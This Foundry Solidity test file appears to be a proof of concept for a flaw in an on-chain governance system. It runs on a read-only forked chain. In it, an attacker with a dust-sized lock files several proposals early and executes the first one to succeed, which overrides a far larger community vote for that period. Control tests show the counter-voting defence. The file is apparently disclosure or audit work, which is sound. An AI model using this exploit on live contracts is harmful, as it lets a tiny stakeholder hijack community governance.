// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./Base.t.sol";
import "../src/interfaces/IGovB.sol";
import "../src/interfaces/ISplitB.sol";
import "../src/interfaces/IEscrowB.sol";

/// Case B. Read-only fork pinned at a fixed block; precompiles mocked; nothing is broadcast.
contract CaseB is Base {
    IGovB gov = IGovB(payable(0x7F8c3a8877368d6A3c727ca18661ec1D681F4365));
    ISplitB sp = ISplitB(0x5C6eF634e279a77D64E21d24B1A1BB4A5e59C5DA);
    IEscrowB ve = IEscrowB(0x3D4b1b884A7a1E59fE8589a3296EC8f8cBB6f279);
    address constant TOKEN_B = 0x7B7c000000000000000000000000000000000001;
    address attacker = address(0xA11CE);
    address community = address(0xC0FFEE);
    uint256 constant WEEK = 604800;

    function _state(uint256 id) internal view returns (uint8) { (bool ok, bytes memory r) = address(gov).staticcall(abi.encodeWithSignature("state(uint256)", id)); require(ok, "state"); return uint8(abi.decode(r,(uint256))); }
    function _cd(uint8 tail) internal pure returns (bytes[] memory cd) { cd = new bytes[](1); cd[0] = abi.encodePacked(ISplitB.nudge.selector, bytes1(tail)); }

    uint256 tA; uint256 tC; uint256 E1; address[] targets; uint256[] values;
    function _setup() internal {
        _fork();
        MockToken m = new MockToken(); vm.etch(TOKEN_B, address(m).code);
        ntv.seed(attacker, 1e15); ntv.seed(community, 5e18);
        vm.startPrank(attacker); ntv.approve(address(ve), type(uint256).max); tA = ve.createLock(1e15, 4 weeks); vm.stopPrank();
        vm.startPrank(community); ntv.approve(address(ve), type(uint256).max); tC = ve.createLock(5e18, 4 weeks); vm.stopPrank();
        E1 = (block.timestamp / WEEK + 1) * WEEK; vm.warp(E1 + 1);
        targets = new address[](1); targets[0] = address(sp); values = new uint256[](1);
    }
    function _community() internal pure returns (bytes[] memory cdC) { cdC = new bytes[](1); cdC[0] = abi.encodeWithSelector(ISplitB.nudge.selector); }

    /// Control 1: no extra proposals. Community files its proposal, votes Against -> needle 80 -> 79.
    function test_control_community_alone_moves_needle_down() public {
        _setup(); uint256 needle0 = sp.needle();
        vm.prank(community); uint256 idC = gov.propose(tC, targets, values, _community(), "y");
        vm.warp(E1 + 1 + 901); vm.prank(community); gov.castVote(idC, tC, 0);
        vm.warp(E1 + WEEK + 902); sp.updatePeriod();
        vm.prank(community); gov.execute(targets, values, _community(), bytes32(0));
        assertEq(sp.needle(), needle0 - 1, "control: community outcome applied");
    }
    /// Control 2: community counter-votes every proposal -> first executed proposal carries the community result (79).
    function test_control_community_countervotes_all() public {
        _setup(); uint256 needle0 = sp.needle();
        uint256[3] memory ids; for (uint8 i = 0; i < 3; i++) { vm.prank(attacker); ids[i] = gov.propose(tA, targets, values, _cd(i), "x"); }
        vm.warp(E1 + 1 + 901);
        for (uint8 i = 0; i < 3; i++) { vm.prank(attacker); gov.castVote(ids[i], tA, 1); vm.prank(community); gov.castVote(ids[i], tC, 0); }
        vm.warp(E1 + WEEK + 902); sp.updatePeriod();
        vm.prank(attacker); gov.execute(targets, values, _cd(1), bytes32(0)); // attacker executes; result is Defeated
        assertEq(sp.needle(), needle0 - 1, "defence works if every proposal is counter-voted");
    }

    function test_first_execute_wins_period() public {
        _fork();
        MockToken m = new MockToken(); vm.etch(TOKEN_B, address(m).code); // second precompile stand-in
        ntv.seed(attacker, 1e15);       // dust lock
        ntv.seed(community, 5e18);      // community lock (5000x larger)
        vm.startPrank(attacker); ntv.approve(address(ve), type(uint256).max); uint256 tA = ve.createLock(1e15, 4 weeks); vm.stopPrank();
        vm.startPrank(community); ntv.approve(address(ve), type(uint256).max); uint256 tC = ve.createLock(5e18, 4 weeks); vm.stopPrank();

        uint256 E1 = (block.timestamp / WEEK + 1) * WEEK; // next epoch start
        vm.warp(E1 + 1);
        uint256 needle0 = sp.needle();
        address[] memory targets = new address[](1); targets[0] = address(sp);
        uint256[] memory values = new uint256[](1);

                // attacker files 3 proposals at the first second of the epoch (threshold = 0)
        uint256[3] memory ids;
        for (uint8 i = 0; i < 3; i++) { vm.prank(attacker); ids[i] = gov.propose(tA, targets, values, _cd(i), "x"); }
        // community files its own proposal one hour later
        vm.warp(E1 + 3601);
        bytes[] memory cdC = new bytes[](1); cdC[0] = abi.encodeWithSelector(ISplitB.nudge.selector);
        vm.prank(community); uint256 idC = gov.propose(tC, targets, values, cdC, "y");

        // voting window (votingDelay = 900s)
        vm.warp(E1 + 3601 + 901);
        for (uint8 i = 0; i < 3; i++) { vm.prank(attacker); gov.castVote(ids[i], tA, 1); } // For (needle up)
        vm.prank(community); gov.castVote(idC, tC, 0);     // community wants needle DOWN
        vm.prank(community); gov.castVote(ids[0], tC, 0);  // community defeats one of them

        // next epoch: attacker's earliest deadline (E1+1+900+WEEK) passes before the community's
        vm.warp(E1 + WEEK + 902);
        sp.updatePeriod(); // permissionless period roll
        assertEq(_state(ids[0]), 3, "p0 defeated by community");   // Defeated
        assertEq(_state(ids[1]), 4, "p1 succeeded with dust vote"); // Succeeded
        vm.prank(attacker); gov.execute(targets, values, _cd(1), bytes32(0));
        assertEq(sp.needle(), needle0 + 1, "needle moved UP by attacker's dust vote");

        // community's own proposal (Defeated, needle down) can no longer execute this period
        vm.warp(E1 + 3601 + 901 + WEEK + 1);
        assertEq(_state(idC), 3, "community proposal defeated => would move needle down");
        vm.prank(community); vm.expectRevert(ISplitB.AlreadyNudged.selector); gov.execute(targets, values, cdC, bytes32(0));
        assertEq(sp.needle(), needle0 + 1, "community outcome overridden");
        emit log_named_uint("needle before", needle0); emit log_named_uint("needle after", sp.needle());
        emit log_named_uint("attacker locked (wei)", 1e15); emit log_named_uint("community locked (wei)", 5e18);
    }
}
